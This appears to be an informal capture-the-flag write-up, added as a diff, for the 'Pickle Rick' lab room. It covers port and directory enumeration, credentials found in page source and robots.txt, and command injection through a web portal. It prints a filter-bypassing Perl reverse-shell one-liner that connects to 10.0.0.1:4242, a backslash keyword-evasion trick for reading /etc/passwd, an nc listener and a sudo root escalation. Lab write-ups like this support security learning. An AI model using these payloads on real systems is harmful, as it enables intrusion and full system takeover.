@@ -1,0 +1,102 @@
+as i have done the pickle rick room earlier so idk what i learned nwe in this room
+
+i just first did rustscan on the ports to look for the open ports
+
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+
+
+
+
+gobuster dir -u http://10.10.95.35 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -x php,txt -t 100
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.95.35
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,txt
+[+] Timeout:                 10s
+===============================================================
+2021/06/19 14:11:11 Starting gobuster in directory enumeration mode
+===============================================================
+/login.php            (Status: 200) [Size: 882]
+/assets               (Status: 301) [Size: 311] [--> http://10.10.95.35/assets/]
+/portal.php           (Status: 302) [Size: 0] [--> /login.php]                  
+/robots.txt           (Status: 200) [Size: 17] 
+
+
+just went to the source code of the main website where i got the username for something which dont know
+
+
+    Note to self, remember username!
+
+    Username: R1ckRul3s
+
+the i went to the robots page and i got something  :  Wubbalubbadubdub
+
+
+then i went to the portal page and enterd these things and i got the command line where i can write commands i went to payload all things and started trying different payloads to get a foothold in the machine
+
+in the end i got one payload succesfull working as some of the commands keywords were filtered like the cat command
+
+
+we can just use escape sequence charater to by pass that filtering 
+
+like cat /etc/passwd  -- > ca\t /etc/passwd
+
+
+for the payload i did the same
+
+pe\rl -e 'use Socket;$i="10.0.0.1";$p=4242;soc\ket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(ST\DIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+and started a listener on the machine nc -lvnp 4242
+
+and this worked fine after i got the basic shell in the machine
+
+i just upgraded it to  a better shell
+by
+
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+export SHELL=bash;
+export TERM=xterm-256color;
+stty rows 24 columns 80;
+ 
+
+
+
+and when i did sudo -l 
+
+
+$ sudo -l
+Matching Defaults entries for www-data on
+    ip-10-10-95-35.eu-west-1.compute.internal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on
+        ip-10-10-95-35.eu-west-1.compute.internal:
+    (ALL) NOPASSWD: ALL
+
+
+
+i saw that www-data was given perms for all so i just ran the superuser command
+
+
+sudo su
+
+
+and managed to get the root users!!
+
+
+cheers
+
